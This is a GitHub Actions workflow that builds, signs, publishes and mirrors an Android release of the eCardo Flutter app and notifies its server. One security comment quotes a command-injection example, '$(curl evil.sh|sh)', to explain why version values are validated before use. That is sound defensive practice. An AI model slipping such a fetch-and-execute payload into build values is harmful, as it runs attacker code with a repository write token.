name: Flutter Android Build

on:
  pull_request:
    branches:
      - main
  push:
    branches:
      - main
    tags:
      - 'v*'
  workflow_dispatch:

jobs:
  # ------------------------------------------------------------------
  # Gate: analyze + test + APK (debug on main/PR, signed release on tags)
  # ------------------------------------------------------------------
  build:
    runs-on: ubuntu-24.04
    permissions:
      # NOTE: `contents: write` is REQUIRED here — this job publishes the
      # GitHub Release and the public mirror on `push: tags: v*`. It is
      # over-broad for the pull_request/main path, where only analyze+test run.
      # The real fix is splitting the tag-publish steps into their own job;
      # left in place deliberately rather than breaking the release path.
      contents: write
    outputs:
      version: ${{ steps.version.outputs.version }}

    steps:
      - name: Checkout source
        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4

      - name: Free disk space
        shell: bash
        run: |
          df -h /
          sudo rm -rf /usr/share/dotnet /usr/local/.ghcup /opt/ghc \
                      /usr/local/share/boost /opt/hostedtoolcache/CodeQL || true
          sudo docker image prune --all --force >/dev/null 2>&1 || true
          sudo apt-get clean || true
          df -h /

      - name: Setup Java
        uses: actions/setup-java@cf277c60eb25467037889841efdb72551f06f6c3 # v4
        with:
          distribution: temurin
          java-version: "17"

      - name: Accept Android SDK licenses
        shell: bash
        run: yes | "$ANDROID_HOME/cmdline-tools/latest/bin/sdkmanager" --licenses >/dev/null 2>&1 || true

      - name: Setup Flutter
        uses: subosito/flutter-action@1a449444c387b1966244ae4d4f8c696479add0b2 # v2
        with:
          flutter-version: "3.44.6"
          cache: true

      - name: Install dependencies
        run: flutter pub get

      - name: Generate localizations
        run: flutter gen-l10n

      - name: Read pubspec version
        id: version
        run: |
          VERSION=$(python3 -c "
          import re
          text = open('pubspec.yaml').read()
          m = re.search(r'^version:\s*([0-9]+\.[0-9]+\.[0-9]+)', text, re.M)
          assert m, 'version not found'
          print(m.group(1))
          ")
          echo "version=$VERSION" >> "$GITHUB_OUTPUT"
          echo "pubspec version=$VERSION"

      - name: Run Analyze (errors are fatal)
        run: |
          flutter analyze --no-fatal-infos --no-fatal-warnings 2>&1 | tee analysis_report.txt || true
          if grep -qE "^ *error •" analysis_report.txt; then
            echo "❌ Analyzer errors found:"
            grep -E "^ *error •" analysis_report.txt
            exit 1
          fi
          echo "✅ No analyzer errors"

      - name: Run Tests
        run: flutter test

      - name: Decode release keystore
        if: startsWith(github.ref, 'refs/tags/v')
        env:
          SIGNING_KEYSTORE_BASE64: ${{ secrets.SIGNING_KEYSTORE_BASE64 }}
          SIGNING_STORE_PASSWORD: ${{ secrets.SIGNING_STORE_PASSWORD }}
          SIGNING_KEY_ALIAS: ${{ secrets.SIGNING_KEY_ALIAS }}
          SIGNING_KEY_PASSWORD: ${{ secrets.SIGNING_KEY_PASSWORD }}
        run: |
          if [ -z "$SIGNING_KEYSTORE_BASE64" ]; then
            echo "❌ SIGNING_KEYSTORE_BASE64 is not set."; exit 1
          fi
          echo "$SIGNING_KEYSTORE_BASE64" | base64 -d > android/ecardo-release.keystore
          cat > android/key.properties <<EOF
          storeFile=ecardo-release.keystore
          storePassword=$SIGNING_STORE_PASSWORD
          keyAlias=$SIGNING_KEY_ALIAS
          keyPassword=$SIGNING_KEY_PASSWORD
          EOF

      # SECURITY: the cert pin baked into the release build. Supplied as a
      # secret so the pin can be rotated without a code change; the backup
      # slot covers the window where a cert swap has already happened but the
      # released apps still carry the old pin. SslPinningConfig fails CLOSED
      # when this is empty, so a release built without it cannot reach the API.
      - name: Resolve TLS certificate pin
        id: certpin
        env:
          CERT_PIN: ${{ secrets.ECARDO_CERT_PIN }}
          CERT_PIN_BACKUP: ${{ secrets.ECARDO_CERT_PIN_BACKUP }}
        run: |
          # Trim whitespace/newlines a UI paste may have introduced.
          CERT_PIN="$(printf '%s' "$CERT_PIN" | tr -d '[:space:]')"
          CERT_PIN_BACKUP="$(printf '%s' "$CERT_PIN_BACKUP" | tr -d '[:space:]')"

          if [ -z "$CERT_PIN" ] && [ -z "$CERT_PIN_BACKUP" ]; then
            if [[ "$GITHUB_REF" == refs/tags/v* ]]; then
              echo "❌ Neither ECARDO_CERT_PIN nor ECARDO_CERT_PIN_BACKUP is set."
              echo "   A release built without a pin is rejected at runtime by"
              echo "   SslPinningConfig (fail-closed), so it would ship an app that"
              echo "   cannot talk to ecardo.ir. Set at least one secret."
              exit 1
            else
              echo "⚠️ Non-tag build; TLS cert pin not required for debug."
            fi
          fi

          # Release builds: a malformed or stale pin fails the build HERE
          # instead of shipping an app that rejects every API call at
          # runtime (SslPinningConfig is fail-closed).
          if [[ "$GITHUB_REF" == refs/tags/v* ]] && { [ -n "$CERT_PIN" ] || [ -n "$CERT_PIN_BACKUP" ]; }; then
            check_pin_format() {
              local label="$1" value="$2"
              [ -z "$value" ] && return 0
              if ! printf '%s' "$value" | base64 -d 2>/dev/null | wc -c | grep -q '^32$'; then
                echo "❌ $label is not a valid base64 SHA-256 cert pin (must decode to exactly 32 bytes)."
                echo "   Recipe: openssl s_client -connect ecardo.ir:443 -servername ecardo.ir </dev/null 2>/dev/null \\"
                echo "     | openssl x509 -outform der | openssl dgst -sha256 -binary | openssl enc -base64"
                exit 1
              fi
            }
            check_pin_format "ECARDO_CERT_PIN" "$CERT_PIN"
            check_pin_format "ECARDO_CERT_PIN_BACKUP" "$CERT_PIN_BACKUP"

            LIVE_PIN="$(echo | openssl s_client -connect ecardo.ir:443 -servername ecardo.ir 2>/dev/null \
              | openssl x509 -outform der 2>/dev/null \
              | openssl dgst -sha256 -binary | openssl enc -base64)"
            if [ -n "$LIVE_PIN" ] && [ "$LIVE_PIN" != "$CERT_PIN" ] && [ "$LIVE_PIN" != "$CERT_PIN_BACKUP" ]; then
              echo "❌ Neither configured pin matches the LIVE ecardo.ir certificate."
              echo "   A release built now would reject every API call (fail-closed)."
              echo "   The correct current pin (public certificate data): $LIVE_PIN"
              exit 1
            fi
            echo "✅ configured pin matches the live ecardo.ir certificate"
          fi

          echo "pin=${CERT_PIN}" >> "$GITHUB_OUTPUT"
          echo "pin_backup=${CERT_PIN_BACKUP}" >> "$GITHUB_OUTPUT"
          echo "✅ certificate pin(s) processed"

      - name: Build APK
        env:
          CERT_PIN: ${{ steps.certpin.outputs.pin }}
          CERT_PIN_BACKUP: ${{ steps.certpin.outputs.pin_backup }}
        run: |
          set -o pipefail
          PIN_ARGS=""
          if [ -n "$CERT_PIN" ]; then
            PIN_ARGS="--dart-define=ECARDO_CERT_PIN=$CERT_PIN"
          fi
          if [ -n "$CERT_PIN_BACKUP" ]; then
            PIN_ARGS="$PIN_ARGS --dart-define=ECARDO_CERT_PIN_BACKUP=$CERT_PIN_BACKUP"
          fi
          if [[ "$GITHUB_REF" == refs/tags/v* ]]; then
            flutter build apk --release --split-per-abi --obfuscate --split-debug-info=build/symbols \
              --target-platform android-arm,android-arm64,android-x64 --tree-shake-icons $PIN_ARGS 2>&1 | tee build_log.txt
            if [ -f build/app/outputs/flutter-apk/app-arm64-v8a-release.apk ]; then
              cp build/app/outputs/flutter-apk/app-arm64-v8a-release.apk build/app/outputs/flutter-apk/app-release.apk
            fi
            test -f build/app/outputs/flutter-apk/app-release.apk
          else
            # Debug builds keep the default (unpinned) behaviour so local dev
            # against a self-signed dev host still works; only releases are pinned.
            flutter build apk --debug 2>&1 | tee build_log.txt
            test -f build/app/outputs/flutter-apk/app-debug.apk
          fi
          echo "APK built successfully!"

      - name: Verify APK signature
        if: startsWith(github.ref, 'refs/tags/v')
        shell: python
        run: |
          import struct, sys, zipfile, os
          APK_PATH = "build/app/outputs/flutter-apk/app-release.apk"
          MAGIC = b"APK Sig Block 42"
          V2_ID, V3_ID, V31_ID = 0x7109871A, 0xF05368C0, 0x1B93AD61
          if not os.path.exists(APK_PATH):
              print(f"❌ APK not found"); sys.exit(1)
          with open(APK_PATH, "rb") as f: data = f.read()
          with zipfile.ZipFile(APK_PATH) as z:
              v1 = [n for n in z.namelist() if n.startswith("META-INF/") and
                    (n.endswith((".SF",".RSA",".DSA")) or n.endswith("MANIFEST.MF"))]
          eocd = data.rfind(b"\x50\x4b\x05\x06", max(0, len(data)-65557))
          if eocd < 0: sys.exit(1)
          cd = struct.unpack("<I", data[eocd+16:eocd+20])[0]
          v2=v3=False
          if cd >= 32 and data[cd-16:cd] == MAGIC:
              block = struct.unpack("<Q", data[cd-24:cd-16])[0]
              pos = cd - block
              while pos < cd - 24:
                  plen = struct.unpack("<Q", data[pos:pos+8])[0]
                  pid = struct.unpack("<I", data[pos+8:pos+12])[0]
                  if pid == V2_ID: v2 = True
                  if pid in (V3_ID, V31_ID): v3 = True
                  pos += 8 + plen
          if not (v1 or v2 or v3):
              print("🔴 UNSIGNED"); sys.exit(2)
          print("✅ SIGNED")

      - name: Publish APK to GitHub Release
        if: startsWith(github.ref, 'refs/tags/v')
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          VERSION="${GITHUB_REF_NAME#v}"
          TAG="v$VERSION"
          STAGED="ecardo_user_v${VERSION}.apk"
          cp build/app/outputs/flutter-apk/app-release.apk "$STAGED"
          gh release view "$TAG" >/dev/null 2>&1 || \
            gh release create "$TAG" --title "v${VERSION}" \
              --notes "Auto-published from ${GITHUB_REF_NAME} (${GITHUB_SHA::7})." --target main
          gh release upload "$TAG" "$STAGED" --clobber
          for f in build/app/outputs/flutter-apk/app-*-release.apk; do
            [ -f "$f" ] || continue
            abi=$(basename "$f" | sed -e 's/app-//' -e 's/-release.apk//')
            cp "$f" "ecardo_user_v${VERSION}_${abi}.apk"
            gh release upload "$TAG" "ecardo_user_v${VERSION}_${abi}.apk" --clobber
          done

      - name: Mirror APK to public releases repo
        if: startsWith(github.ref, 'refs/tags/v')
        env:
          GH_TOKEN: ${{ secrets.ECRDO_RELEASE_TOKEN }}
          FALLBACK_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          VERSION="${GITHUB_REF_NAME#v}"
          APK_NAME="ecardo_user_v${VERSION}.apk"
          PUB="mahankarimi1382/ecardo-apps-releases"
          PUB_TAG="userapp-v${VERSION}"
          cp build/app/outputs/flutter-apk/app-release.apk "$APK_NAME"
          export GH_TOKEN="${GH_TOKEN:-$FALLBACK_TOKEN}"
          gh release view "$PUB_TAG" -R "$PUB" >/dev/null 2>&1 || \
            gh release create "$PUB_TAG" -R "$PUB" \
              --title "eCardo userapp v${VERSION}" \
              --notes "Public mirror of ${GITHUB_REPOSITORY} v${VERSION}"
          gh release upload "$PUB_TAG" -R "$PUB" "$APK_NAME" --clobber
          echo "PUBLIC_URL=https://github.com/${PUB}/releases/download/${PUB_TAG}/${APK_NAME}" >> "$GITHUB_ENV"

      - name: Notify eCardo Server of new release
        if: startsWith(github.ref, 'refs/tags/v')
        env:
          ECARDO_DEPLOY_SECRET: ${{ secrets.ECARDO_DEPLOY_SECRET }}
        run: |
          DEPLOY_SECRET="${ECARDO_DEPLOY_SECRET:?missing}"
          VERSION="${GITHUB_REF_NAME#v}"
          DOWNLOAD_URL="${PUBLIC_URL:?mirror missing}"
          set -o pipefail
          # v1.0.91: publish the digest of the EXACT artifact we mirrored.
          # The in-app updater hashes the file it downloads and refuses to
          # install on a mismatch, so a missing/stale digest here means every
          # user gets "integrity check failed" right after a successful
          # download. sha256sum must read the same staged APK the mirror step
          # uploaded, not a rebuild.
          APK_NAME="ecardo_user_v${VERSION}.apk"
          SHA256="$(sha256sum "$APK_NAME" | awk '{print $1}')"
          echo "apk=$APK_NAME sha256=$SHA256"
          test -n "$SHA256"
          echo "SHA256=${SHA256}" >> "$GITHUB_ENV"
          # Transient ecardo.ir 5xx (e.g. 503 "Server Error" on v1.0.118 and
          # v1.0.121 tag builds) must not fail a release whose APK is already
          # published and mirrored — retry transport-level failures only.
          # A 200 with notification.sent=false still fails the checks below.
          attempt=1
          until curl --fail-with-body --show-error --silent \
            -X POST https://ecardo.ir/api/user/github-deploy-webhook \
            -A "Mozilla/5.0" -H "Accept: application/json" \
            -H "Content-Type: application/json" -H "Origin: https://ecardo.ir" \
            -H "X-ECardo-Deploy-Source: github-actions" --compressed \
            -d "{\"secret\":\"$DEPLOY_SECRET\",\"app_type\":\"user\",\"version\":\"$VERSION\",\"download_url\":\"$DOWNLOAD_URL\",\"sha256\":\"$SHA256\"}" \
            | tee notify-result.txt; do
            if [ "$attempt" -ge 4 ]; then
              echo "❌ Server notify failed after $attempt attempts"
              exit 1
            fi
            echo "⚠️ notify attempt $attempt failed — retrying in $((attempt * 15))s"
            sleep "$((attempt * 15))"
            attempt=$((attempt + 1))
          done
          grep -q "Successfully deployed" notify-result.txt
          # v1.0.91: the webhook now reports whether the push notification was
          # actually delivered. Fail the step when it was not, so a silent
          # notification regression can never look like a green release again.
          python3 -c "import json,sys;n=(json.load(open('notify-result.txt')).get('notification') or {});print('notification:',json.dumps(n,ensure_ascii=False));sys.exit(0 if n.get('sent') else 1)"

      # wallet-modules v1.0.123: keep obfuscation symbols so field crashes
      # (error_logs build_id) can be symbolicated to the exact class.
      - name: Upload Debug Symbols
        if: always()
        continue-on-error: true
        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
        with:
          name: debug-symbols-${{ github.sha }}
          if-no-files-found: ignore
          retention-days: 14
          path: build/symbols/

      - name: Upload Build Log
        if: always()
        continue-on-error: true
        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
        with:
          name: build-log
          if-no-files-found: warn
          retention-days: 3
          path: |
            build_log.txt
            analysis_report.txt
            notify-result.txt

  # ------------------------------------------------------------------
  # On main: if pubspec version has no v* tag yet, create tag + full
  # signed release + mirror + server notify IN THIS SAME RUN.
  # (GITHUB_TOKEN tag push does not start a second workflow — so we
  # must publish here or users never get an update notification.)
  # ------------------------------------------------------------------
  release-if-untagged:
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
    needs: [build]
    runs-on: ubuntu-24.04
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
          fetch-depth: 0

      - name: Decide whether release is needed
        id: gate
        env:
          # SECURITY: never interpolate step outputs directly into a run: block.
          # Values derived from pubspec.yaml are author-controlled; a value such
          # as `$(curl evil.sh|sh)` would execute here with a contents:write token.
          PUBSPEC_VERSION: ${{ needs.build.outputs.version }}
        run: |
          set -euo pipefail
          VERSION="${PUBSPEC_VERSION:?no version from build job}"
          # Reject anything that is not a bare dotted version before it is used
          # in a git ref, a file name, or a JSON payload.
          if ! printf '%s' "$VERSION" | grep -Eq '^[0-9]+\.[0-9]+\.[0-9]+$'; then
            echo "❌ Refusing malformed version from build job: '$VERSION'"
            exit 1
          fi
          TAG="v${VERSION}"
          echo "version=$VERSION" >> "$GITHUB_OUTPUT"
          echo "tag=$TAG" >> "$GITHUB_OUTPUT"
          if git ls-remote --tags origin "refs/tags/${TAG}" | grep -q .; then
            echo "Tag ${TAG} already exists — skip release-if-untagged."
            echo "needed=false" >> "$GITHUB_OUTPUT"
          else
            echo "Tag ${TAG} missing — will create tag and release."
            echo "needed=true" >> "$GITHUB_OUTPUT"
          fi

      - name: Create annotated tag
        if: steps.gate.outputs.needed == 'true'
        env:
          TAG: ${{ steps.gate.outputs.tag }}
          PAT: ${{ secrets.ECRDO_RELEASE_TOKEN }}
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          set -euo pipefail
          if ! printf '%s' "$TAG" | grep -Eq '^v[0-9]+\.[0-9]+\.[0-9]+$'; then
            echo "❌ Refusing malformed tag: '$TAG'"; exit 1
          fi
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git tag -a "$TAG" -m "userapp ${TAG} (release-if-untagged ${GITHUB_SHA::7})"
          PUSH_TOKEN="${PAT:-$GITHUB_TOKEN}"
          git remote set-url origin "https://x-access-token:${PUSH_TOKEN}@github.com/${GITHUB_REPOSITORY}.git"
          git push origin "refs/tags/${TAG}"
          echo "✅ Pushed ${TAG}"

      - name: Free disk space
        if: steps.gate.outputs.needed == 'true'
        run: |
          sudo rm -rf /usr/share/dotnet /usr/local/.ghcup /opt/ghc \
                      /usr/local/share/boost /opt/hostedtoolcache/CodeQL || true
          sudo docker image prune --all --force >/dev/null 2>&1 || true

      - name: Setup Java
        if: steps.gate.outputs.needed == 'true'
        uses: actions/setup-java@cf277c60eb25467037889841efdb72551f06f6c3 # v4
        with:
          distribution: temurin
          java-version: "17"

      - name: Accept Android SDK licenses
        if: steps.gate.outputs.needed == 'true'
        run: yes | "$ANDROID_HOME/cmdline-tools/latest/bin/sdkmanager" --licenses >/dev/null 2>&1 || true

      - name: Setup Flutter
        if: steps.gate.outputs.needed == 'true'
        uses: subosito/flutter-action@1a449444c387b1966244ae4d4f8c696479add0b2 # v2
        with:
          flutter-version: "3.44.6"
          cache: true

      - name: Install + l10n
        if: steps.gate.outputs.needed == 'true'
        run: |
          flutter pub get
          flutter gen-l10n

      - name: Decode release keystore
        if: steps.gate.outputs.needed == 'true'
        env:
          SIGNING_KEYSTORE_BASE64: ${{ secrets.SIGNING_KEYSTORE_BASE64 }}
          SIGNING_STORE_PASSWORD: ${{ secrets.SIGNING_STORE_PASSWORD }}
          SIGNING_KEY_ALIAS: ${{ secrets.SIGNING_KEY_ALIAS }}
          SIGNING_KEY_PASSWORD: ${{ secrets.SIGNING_KEY_PASSWORD }}
        run: |
          if [ -z "$SIGNING_KEYSTORE_BASE64" ]; then
            echo "❌ SIGNING_KEYSTORE_BASE64 missing"; exit 1
          fi
          echo "$SIGNING_KEYSTORE_BASE64" | base64 -d > android/ecardo-release.keystore
          cat > android/key.properties <<EOF
          storeFile=ecardo-release.keystore
          storePassword=$SIGNING_STORE_PASSWORD
          keyAlias=$SIGNING_KEY_ALIAS
          keyPassword=$SIGNING_KEY_PASSWORD
          EOF

      - name: Build signed release APK
        if: steps.gate.outputs.needed == 'true'
        env:
          CERT_PIN: ${{ secrets.ECARDO_CERT_PIN }}
          CERT_PIN_BACKUP: ${{ secrets.ECARDO_CERT_PIN_BACKUP }}
        run: |
          set -euo pipefail
          set -o pipefail
          if [ -z "$CERT_PIN" ] && [ -z "$CERT_PIN_BACKUP" ]; then
            echo "❌ No certificate pin secret set — refusing to build a release"
            echo "   that SslPinningConfig would reject at runtime. Set"
            echo "   ECARDO_CERT_PIN (and preferably ECARDO_CERT_PIN_BACKUP)."
            exit 1
          fi
          PIN_ARGS=""
          if [ -n "$CERT_PIN" ]; then
            PIN_ARGS="--dart-define=ECARDO_CERT_PIN=$CERT_PIN"
          fi
          if [ -n "$CERT_PIN_BACKUP" ]; then
            PIN_ARGS="$PIN_ARGS --dart-define=ECARDO_CERT_PIN_BACKUP=$CERT_PIN_BACKUP"
          fi
          flutter build apk --release --split-per-abi --obfuscate --split-debug-info=build/symbols \
            --target-platform android-arm,android-arm64,android-x64 --tree-shake-icons $PIN_ARGS 2>&1 | tee build_log.txt
          if [ -f build/app/outputs/flutter-apk/app-arm64-v8a-release.apk ]; then
            cp build/app/outputs/flutter-apk/app-arm64-v8a-release.apk build/app/outputs/flutter-apk/app-release.apk
          fi
          test -f build/app/outputs/flutter-apk/app-release.apk
          ls -lh build/app/outputs/flutter-apk/*.apk

      - name: Publish + mirror + notify
        if: steps.gate.outputs.needed == 'true'
        env:
          VERSION: ${{ steps.gate.outputs.version }}
          TAG: ${{ steps.gate.outputs.tag }}
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          ECRDO_RELEASE_TOKEN: ${{ secrets.ECRDO_RELEASE_TOKEN }}
          ECARDO_DEPLOY_SECRET: ${{ secrets.ECARDO_DEPLOY_SECRET }}
        run: |
          set -euo pipefail
          if ! printf '%s' "$VERSION" | grep -Eq '^[0-9]+\.[0-9]+\.[0-9]+$'; then
            echo "❌ Refusing malformed version: '$VERSION'"; exit 1
          fi
          APK_NAME="ecardo_user_v${VERSION}.apk"
          cp build/app/outputs/flutter-apk/app-release.apk "$APK_NAME"

          # Private repo release
          gh release view "$TAG" >/dev/null 2>&1 || \
            gh release create "$TAG" --title "v${VERSION}" \
              --notes "Auto-published by release-if-untagged (${GITHUB_SHA::7})." --target main
          gh release upload "$TAG" "$APK_NAME" --clobber
          echo "✅ GitHub Release $TAG"

          # Public mirror (needs PAT with access to ecardo-apps-releases)
          PUB="mahankarimi1382/ecardo-apps-releases"
          PUB_TAG="userapp-v${VERSION}"
          export GH_TOKEN="${ECRDO_RELEASE_TOKEN:-$GH_TOKEN}"
          gh release view "$PUB_TAG" -R "$PUB" >/dev/null 2>&1 || \
            gh release create "$PUB_TAG" -R "$PUB" \
              --title "eCardo userapp v${VERSION}" \
              --notes "Public mirror of ${GITHUB_REPOSITORY} v${VERSION}"
          gh release upload "$PUB_TAG" -R "$PUB" "$APK_NAME" --clobber
          DOWNLOAD_URL="https://github.com/${PUB}/releases/download/${PUB_TAG}/${APK_NAME}"
          echo "✅ Mirrored $DOWNLOAD_URL"

          # Digest of the exact artifact we just mirrored. The in-app updater hashes
          # the file it downloads and refuses to install on a mismatch, so this must
          # be the staged APK above — not a rebuild, not an older release's digest.
          SHA256="$(sha256sum "$APK_NAME" | awk '{print $1}')"
          test -n "$SHA256"
          echo "✅ APK sha256=$SHA256"
          #
          # Server notify → app_version
          DEPLOY_SECRET="${ECARDO_DEPLOY_SECRET:?ECARDO_DEPLOY_SECRET missing}"
          set -o pipefail
          # Same transient-5xx retry as the tag-build notify step above.
          attempt=1
          until curl --fail-with-body --show-error --silent \
            -X POST https://ecardo.ir/api/user/github-deploy-webhook \
            -A "Mozilla/5.0" -H "Accept: application/json" \
            -H "Content-Type: application/json" -H "Origin: https://ecardo.ir" \
            -H "X-ECardo-Deploy-Source: github-actions" --compressed \
            -d "{\"secret\":\"$DEPLOY_SECRET\",\"app_type\":\"user\",\"version\":\"$VERSION\",\"download_url\":\"$DOWNLOAD_URL\",\"sha256\":\"$SHA256\"}" \
            | tee notify-result.txt; do
            if [ "$attempt" -ge 4 ]; then
              echo "❌ Server notify failed after $attempt attempts"
              exit 1
            fi
            echo "⚠️ notify attempt $attempt failed — retrying in $((attempt * 15))s"
            sleep "$((attempt * 15))"
            attempt=$((attempt + 1))
          done
          grep -q "Successfully deployed" notify-result.txt
          echo "✅ Server notified app_version=$VERSION sha256=$SHA256"
          # The webhook reports whether the push to users actually went out. Without
          # this assertion a failed notification is indistinguishable from a working
          # one, because the old controller swallowed every FCM error.
          python3 -c "import json,sys;n=(json.load(open('notify-result.txt')).get('notification') or {});print('notification:',json.dumps(n,ensure_ascii=False));sys.exit(0 if n.get('sent') else 1)"
